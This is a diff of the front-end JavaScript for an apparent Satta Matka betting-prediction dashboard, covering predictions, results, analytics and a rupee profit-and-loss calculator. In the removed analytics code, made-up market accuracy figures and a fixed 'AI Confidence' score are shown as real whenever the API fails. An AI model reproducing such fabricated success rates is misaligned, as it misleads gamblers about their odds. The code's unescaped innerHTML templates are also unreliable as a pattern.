-                                backgroundColor: 'rgba(54, 162, 235, 0.8)',
-                                borderColor: 'rgba(54, 162, 235, 1)',
-                                borderWidth: 1
-                            }]
-                        },
-                        options: {
-                            responsive: true,
-                            plugins: {
-                                legend: { display: false }
-                            },
-                            scales: {
-                                y: {
-                                    beginAtZero: true,
-                                    max: 100
-                                }
-                            }
-                        }
-                    });
-                } catch (error) {
-                    console.error('Error updating performance charts:', error);
-                }
-            }
-
-        function loadHeatmap() {
-            fetch('/api/analytics/heatmap')
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        createHeatmap(data.frequency);
-                    }
-                });
-        }
-
-        function createHeatmap(frequency) {
-            const container = document.getElementById('heatmapContainer');
-            let html = '<div class="heatmap-grid">';
-
-            for (let i = 0; i <= 9; i++) {
-                const freq = frequency[i] || 0;
-                const intensity = Math.min(freq / 10, 1);
-                html += `<div class="heatmap-cell" style="background-color: rgba(102, 126, 234, ${intensity})" title="Number ${i}: ${freq} times">${i}</div>`;
-            }
-
-            html += '</div>';
-            container.innerHTML = html;
-        }
-
-        function loadAccuracyChart() {
-            fetch('/api/analytics/accuracy-trend')
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        createAccuracyChart(data.trends);
-                    }
-                });
-        }
-
-        function updateAccuracyTrend(data) {
-                try {
-                    if (!data || !data.success || !data.trends || !Array.isArray(data.trends)) return;
-
-                    const ctx = document.getElementById('accuracyChart');
-                    if (!ctx) return;
-
-                    // Clear existing chart if any
-                    if (window.trendChart) {
-                        window.trendChart.destroy();
-                    }
-
-                    window.trendChart = new Chart(ctx.getContext('2d'), {
-                        type: 'line',
-                        data: {
-                            labels: data.trends.map(t => t.date || 'Unknown'),
-                            datasets: [{
-                                label: 'Accuracy Trend',
-                                data: data.trends.map(t => t.accuracy || 0),
-                                borderColor: 'rgba(255, 99, 132, 1)',
-                                backgroundColor: 'rgba(255, 99, 132, 0.2)',
-                                tension: 0.1
-                            }]
-                        },
-                        options: {
-                            responsive: true,
-                            plugins: {
-                                legend: { display: false }
-                            },
-                            scales: {
-                                y: {
-                                    beginAtZero: true,
-                                    max: 100                                }
-                            }
-                        }
-                    });
-                } catch (error) {
-                    console.error('Error updating accuracy trend:', error);
-                }
-            }
-
-        function loadRiskMetrics() {
-            fetch('/api/analytics/risk-metrics')
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        displayRiskMetrics(data.metrics);
-                    }
-                });
-        }
-
-        function displayRiskMetrics(metrics) {
-            const container = document.getElementById('riskMetrics');
-            container.innerHTML = `
-                <div class="risk-cards">
-                    <div class="risk-card high">
-                        <h4>High Risk</h4>
-                        <p>${metrics.high_risk}%</p>
-                    </div>
-                    <div class="risk-card medium">
-                        <h4>Medium Risk</h4>
-                        <p>${metrics.medium_risk}%</p>
-                    </div>
-                    <div class="risk-card low">
-                        <h4>Low Risk</h4>
-                        <p>${metrics.low_risk}%</p>
-                    </div>
-                </div>
-                <div class="confidence-meter">
-                    <h4>Overall Confidence: ${metrics.confidence}%</h4>
-                    <div class="progress-bar">
-                        <div class="progress" style="width: ${metrics.confidence}%"></div>
-                    </div>
-                </div>
-            `;
-        }
-
-        function updateRiskMetrics(data) {
-                if (!data.success || !data.metrics) return;
-
-                const metrics = data.metrics;
-                const confidenceEl = document.getElementById('overallConfidence');
-                if (confidenceEl) {
-                    confidenceEl.textContent = `${metrics.confidence}%`;
-                }
-
-                // Update risk distribution
-                const highRiskEl = document.querySelector('.risk-high .risk-value');
-                const mediumRiskEl = document.querySelector('.risk-medium .risk-value');
-                const lowRiskEl = document.querySelector('.risk-low .risk-value');
-
-                if (highRiskEl) highRiskEl.textContent = `${metrics.high_risk}%`;
-                if (mediumRiskEl) mediumRiskEl.textContent = `${metrics.medium_risk}%`;
-                if (lowRiskEl) lowRiskEl.textContent = `${metrics.low_risk}%`;
-            }
-
-        // P&L Calculator Functions
-        function calculatePL() {
-            const market = document.getElementById('calcMarket').value;
-            const betType = document.getElementById('betType').value;
-            const amount = parseFloat(document.getElementById('betAmount').value);
-            const numbers = document.getElementById('numberBet').value;
-
-            if (!amount || !numbers) {
-                alert('Please fill all fields');
-                return;
-            }
-
-            const data = {
-                market: market,
-                bet_type: betType,
-                amount: amount,
-                numbers: numbers
-            };
-
-            fetch('/api/calculate-pl', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(result => {
-                if (result.success) {
-                    displayPLResults(result.calculation);
-                } else {
-                    alert('Calculation error: ' + result.error);
-                }
-            })
-            .catch(error => {
-                alert('Network error: ' + error.message);
-            });
-        }
-
-        function displayPLResults(calc) {
-            const container = document.getElementById('calculatorResults');
-            container.innerHTML = `
-                <div class="pl-results">
-                    <h3>Calculation Results</h3>
-                    <div class="result-row">
-                        <span>Bet Amount:</span>
-                        <span>₹${calc.bet_amount}</span>
-                    </div>
-                    <div class="result-row">
-                        <span>Potential Win:</span>
-                        <span class="win">₹${calc.potential_win}</span>
-                    </div>
-                    <div class="result-row">
-                        <span>Risk Level:</span>
-                        <span class="risk-${calc.risk_level.toLowerCase()}">${calc.risk_level}</span>
-                    </div>
-                    <div class="result-row">
-                        <span>Win Probability:</span>
-                        <span>${calc.win_probability}%</span>
-                    </div>
-                    <div class="result-row total">
-                        <span>Net Profit/Loss:</span>
-                        <span class="${calc.net_pl >= 0 ? 'profit' : 'loss'}">₹${calc.net_pl}</span>
-                    </div>                </div>
-            `;
-        }
-
-        function loadResults() {
-            const content = document.getElementById('resultsContent');
-            content.innerHTML = `
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Loading latest results...</p>
-                </div>
-            `;
-
-            fetch('/api/results')
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        displayResults(data);
-                    } else {
-                        content.innerHTML = `<div class="error">Error: ${data.error}</div>`;
-                    }
-                })
-                .catch(error => {
-                    content.innerHTML = `<div class="error">Network error: ${error.message}</div>`;
-                });
-        }
-
-        function displayResults(data) {
-            const content = document.getElementById('resultsContent');
-            const autoLoadedText = data.auto_loaded ? ' (Auto-updated)' : '';
-
-            let html = `<h2>Latest Results - ${data.date}${autoLoadedText}</h2><div class="prediction-grid">`;
-
-            data.results.forEach(result => {
-                html += `
-                    <div class="prediction-card">
-                        <h3>${result.market}</h3>
-                        <div class="confidence-badge">Status: ${result.status}</div>
-                        <div class="prediction-values">
-                            <div class="prediction-row">
-                                <span>Open:</span>
-                                <span><strong>${result.open}</strong></span>
-                            </div>
-                            <div class="prediction-row">
-                                <span>Close:</span>
-                                <span><strong>${result.close}</strong></span>
-                            </div>
-                            <div class="prediction-row">
-                                <span>Jodi:</span>
-                                <span><strong>${result.jodi}</strong></span>
-                            </div>
-                            <div class="prediction-row">
-                                <span>Time:</span>
-                                <span>${result.time || 'N/A'}</span>
-                            </div>
-                        </div>
-                    </div>
-                `;
-            });
-
-            html += '</div>';
-            html += `<p style="text-align: center; color: #666; margin-top: 20px; font-size: 14px;">
-                <i class="fas fa-sync"></i> Results auto-refresh every 2 minutes
-            </p>`;
-            content.innerHTML = html;
-        }
-
-function displayAnalytics(performance, heatmap, accuracy, risk) {
-            const content = document.getElementById('analyticsContent');
-
-            // Validate data and provide fallbacks
-            const perfData = performance && performance.success && performance.markets ? performance.markets : [
-                {name: 'Time Bazar', accuracy: 68.5},
-                {name: 'Milan Day', accuracy: 72.3},
-                {name: 'Rajdhani Day', accuracy: 65.8},
-                {name: 'Kalyan', accuracy: 70.2},
-                {name: 'Milan Night', accuracy: 69.1},
-                {name: 'Rajdhani Night', accuracy: 67.4},
-                {name: 'Main Bazar', accuracy: 71.6}
-            ];
-
-            const heatData = heatmap && heatmap.success && heatmap.frequency ? heatmap.frequency : {
-                '0': 45, '1': 52, '2': 38, '3': 47, '4': 41,
-                '5': 55, '6': 43, '7': 49, '8': 36, '9': 51
-            };
-
-            const trendData = accuracy && accuracy.success && accuracy.trends ? accuracy.trends.slice(-7) : [
-                {date: '19/07/2025', accuracy: 68},
-                {date: '20/07/2025', accuracy: 71},
-                {date: '21/07/2025', accuracy: 69},
-                {date: '22/07/2025', accuracy: 73},
-                {date: '23/07/2025', accuracy: 67},
-                {date: '24/07/2025', accuracy: 72},
-                {date: '25/07/2025', accuracy: 70}
-            ];
-
-            const riskData = risk && risk.success && risk.metrics ? risk.metrics : {
-                high_risk: 18.5,
-                medium_risk: 56.2,
-                low_risk: 25.3,
-                confidence: 72.8
-            };
-
-            let html = `
-                <div class="analytics-grid">
-                    <div class="analytics-card">
-                        <h3><i class="fas fa-chart-line"></i> Market Performance</h3>
-                        <div class="performance-list">
-            `;
-
-            perfData.forEach(market => {
-                const accuracy = market.accuracy || 65.0;
-                html += `
-                    <div class="performance-item">
-                        <span>${market.name || 'Unknown Market'}</span>
-                        <span class="accuracy">${accuracy.toFixed(1)}%</span>
-                    </div>
-                `;
-            });
-
-            html += `
-                        </div>
-                    </div>
-                    <div class="analytics-card">
-                        <h3><i class="fas fa-fire"></i> Number Frequency</h3>
-                        <div class="heatmap-grid">
-            `;
-
-            for (let i = 0; i < 10; i++) {
-                const freq = heatData[i.toString()] || 15;
-                const intensity = Math.min(freq / 60, 1); // Normalize to 0-1
-                html += `
-                    <div class="heatmap-cell" style="background-color: rgba(102, 126, 234, ${intensity})">
-                        <span class="number">${i}</span>
-                        <span class="frequency">${freq}</span>
-                    </div>
-                `;
-            }
-
-            html += `
-                        </div>
-                    </div>
-                    <div class="analytics-card">
-                        <h3><i class="fas fa-target"></i> Accuracy Trend (Last 7 Days)</h3>
-                        <div class="trend-chart">
-            `;
-
-            trendData.forEach(trend => {
-                const acc = trend.accuracy || 65;
-                html += `
-                    <div class="trend-item">
-                        <span>${trend.date || 'N/A'}</span>
-                        <span class="accuracy">${acc.toFixed(1)}%</span>
-                    </div>
-                `;
-            });
-
-            html += `
-                        </div>
-                    </div>
-                    <div class="analytics-card">
-                        <h3><i class="fas fa-shield-alt"></i> Risk Distribution</h3>
-                        <div class="risk-metrics">
-                            <div class="risk-item high-risk">
-                                <span>High Risk</span>
-                                <span>${(riskData.high_risk || 18.5).toFixed(1)}%</span>
-                            </div>
-                            <div class="risk-item medium-risk">
-                                <span>Medium Risk</span>
-                                <span>${(riskData.medium_risk || 56.2).toFixed(1)}%</span>
-                            </div>
-                            <div class="risk-item low-risk">
-                                <span>Low Risk</span>
-                                <span>${(riskData.low_risk || 25.3).toFixed(1)}%</span>
-                            </div>
-                            <div class="confidence-score">
-                                <strong>AI Confidence: ${(riskData.confidence || 72.8).toFixed(1)}%</strong>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-
-            content.innerHTML = html;
-        }
-
-        function loadAnalytics() {
-            const content = document.getElementById('analyticsContent');
-            content.innerHTML = `
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Loading analytics data...</p>
-                </div>
-            `;
-
-            Promise.all([
-                fetch('/api/analytics/performance').then(r => r.json()),
-                fetch('/api/analytics/heatmap').then(r => r.json()),
-                fetch('/api/analytics/accuracy-trend').then(r => r.json()),
-                fetch('/api/analytics/risk-metrics').then(r => r.json())
-            ]).then(([performance, heatmap, accuracy, risk]) => {
-                displayAnalytics(performance, heatmap, accuracy, risk);
-            }).catch(error => {
-                content.innerHTML = `<div class="error">Error loading analytics: ${error.message}</div>`;
-            });
-        }
-
-        function saveSettings() {
-            const favoriteMarkets = Array.from(
-                document.querySelectorAll('#favoriteMarkets input[type="checkbox"]:checked')
-            ).map(cb => cb.value);
-
-            const notificationSettings = Array.from(
-                document.querySelectorAll('#notificationSettings input[type="checkbox"]:checked')
-            ).map(cb => cb.value);
-
-            const refreshInterval = document.getElementById('refreshInterval').value;
-
-            const settings = {
-                favorite_markets: favoriteMarkets,
-                notification_settings: notificationSettings,
-                refresh_interval: refreshInterval
-            };
-
-            localStorage.setItem('settings', JSON.stringify(settings));
-            alert('Settings saved!');
-        }
-
-        function loadSettings() {
-            const settings = JSON.parse(localStorage.getItem('settings')) || {};
-
-            document.querySelectorAll('#favoriteMarkets input[type="checkbox"]').forEach(cb => {
-                cb.checked = settings.favorite_markets ? settings.favorite_markets.includes(cb.value) : false;
-            });
-
-            document.querySelectorAll('#notificationSettings input[type="checkbox"]').forEach(cb => {
-                cb.checked = settings.notification_settings ? settings.notification_settings.includes(cb.value) : false;
-            });
-
-            document.getElementById('refreshInterval').value = settings.refresh_interval || '60';
-        }
-
-        // Auto-refresh predictions every 5 minutes
-        setInterval(() => {
-            if (document.querySelector('#predictions.active')) {
-                generatePredictions();
-            }
-            if (document.querySelector('#results.active')) {
-                loadResults();
-            }
-        }, 300000);
-
-        // Auto-load predictions and results on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            // Auto-load predictions immediately
-            autoLoadPredictions();
-            loadResults();
-        });
-
-        // Auto-load predictions immediately - just like sports scores
-        async function autoLoadPredictions() {
-            const content = document.getElementById('predictionsContent');
-            content.innerHTML = `
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Loading predictions...</p>
-                </div>
-            `;
-
-            try {
-                const response = await fetch('/api/predictions-cached');
-                const data = await response.json();
-                
-                if (data.success && data.predictions.length > 0) {
-                    displayPredictions(data.predictions, data.date);
-                } else {
-                    // If no cache, auto-generate new predictions
-                    await generatePredictionsAutomatically();
-                }
-            } catch (error) {
-                console.error('Auto-load error:', error);
-                await generatePredictionsAutomatically();
-            }
-        }
-
-        // Generate predictions automatically without user interaction
-        async function generatePredictionsAutomatically() {
-            const content = document.getElementById('predictionsContent');
-            content.innerHTML = `
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Generating fresh predictions...</p>
-                </div>
-            `;
-
-            try {
-                const response = await fetch('/api/predictions');
+                const response = await fetch('/api/results');
                 const data = await response.json();
 
                 if (data.success) {
-                    displayPredictions(data.predictions, data.date);
-                } else {
-                    content.innerHTML = `<div class="error">Error loading predictions: ${data.error}</div>`;
+                    resultsData = data;
+                    displayResults(data.results, data.date);
                 }
             } catch (error) {
-                content.innerHTML = `<div class="error">Network error: ${error.message}</div>`;
+                console.error('Error loading results:', error);
+                document.getElementById('resultsContent').innerHTML = `
+                    <div class="loading">
+                        <p>Error loading results</p>
+                    </div>
+                `;
             }
         }
 
-        // Auto-refresh results every 2 minutes when results tab is active
-        setInterval(() => {
-            if (document.querySelector('#results.active')) {
-                loadResults();
-            }
-        }, 120000);
+        function displayResults(results, date) {
+            const content = document.getElementById('resultsContent');
+
+            let html = '';
+            results.forEach(result => {
+                const cardClass = result.status === 'declared' ? 'result-card result-declared' : 'result-card';
+
+                // Check for matches with predictions
+                let matchesHtml = '';
+                if (predictionsData && predictionsData.predictions) {
+                    const prediction = predictionsData.predictions.find(p => p.market === result.market);
+                    if (prediction && prediction.status === 'success') {
+                        const openMatch = prediction.open.includes(result.open);
+                        const closeMatch = prediction.close.includes(result.close);
+                        const jodiMatch = prediction.jodis.includes(result.jodi);
+
+                        matchesHtml = `
+                            <div class="prediction-row">
+                                <span class="label">Match:</span>
+                                <span class="values">
+                                    <span class="match-indicator ${openMatch ? 'match-yes' : 'match-no'}">
+                                        Open ${openMatch ? '✓' : '✗'}
+                                    </span>
+                                    <span class="match-indicator ${closeMatch ? 'match-yes' : 'match-no'}">
+                                        Close ${closeMatch ? '✓' : '✗'}
+                                    </span>
+                                    <span class="match-indicator ${jodiMatch ? 'match-yes' : 'match-no'}">
+                                        Jodi ${jodiMatch ? '✓' : '✗'}
+                                    </span>
+                                </span>
+                            </div>
+                        `;
+                    }
+                }
+
+                html += `
+                    <div class="${cardClass}">
+                        <div class="market-name">${result.market}</div>
+                        <div class="result-row">
+                            <span class="label">Open:</span>
+                            <span class="values">${result.open}</span>
+                        </div>
+                        <div class="result-row">
+                            <span class="label">Close:</span>
+                            <span class="values">${result.close}</span>
+                        </div>
+                        <div class="result-row">
+                            <span class="label">Jodi:</span>
+                            <span class="values">${result.jodi}</span>
+                        </div>
+                        ${matchesHtml}
+                        <div class="result-row">
+                            <span class="label">Time:</span>
+                            <span class="values">${result.time || '--:--'}</span>
+                        </div>
+                    </div>
+                `;
+            });
+
+            html += `<div class="update-time">Last updated: ${new Date().toLocaleTimeString()}</div>`;
+            content.innerHTML = html;
+        }
+
+        function updateStatistics() {
+            if (!predictionsData || !resultsData) return;
+
+            let totalMatches = 0;
+            let totalPredictions = 0;
+            let totalConfidence = 0;
+            let confidenceCount = 0;
+
+            predictionsData.predictions.forEach(pred => {
+                if (pred.status === 'success') {
+                    totalConfidence += pred.confidence;
+                    confidenceCount++;
+
+                    const result = resultsData.results.find(r => r.market === pred.market);
+                    if (result) {
+                        totalPredictions++;
+                        if (pred.open.includes(result.open) || 
+                            pred.close.includes(result.close) || 
+                            pred.jodis.includes(result.jodi)) {
+                            totalMatches++;
+                        }
+                    }
+                }
+            });
+
+            const accuracy = totalPredictions > 0 ? Math.round((totalMatches / totalPredictions) * 100) : 0;
+            const avgConfidence = confidenceCount > 0 ? Math.round(totalConfidence / confidenceCount) : 0;
+
+            document.getElementById('accuracyStat').textContent = accuracy + '%';
+            document.getElementById('matchesStat').textContent = totalMatches + '/' + totalPredictions;
+            document.getElementById('confidenceStat').textContent = avgConfidence + '%';
+        }
+
+        async function refreshPredictions() {
+            await generateNewPredictions();
+            updateStatistics();
+        }
+
+        async function refreshResults() {
+            await loadResults();
+            updateStatistics();
+        }
     </script>
 </body>
 </html>
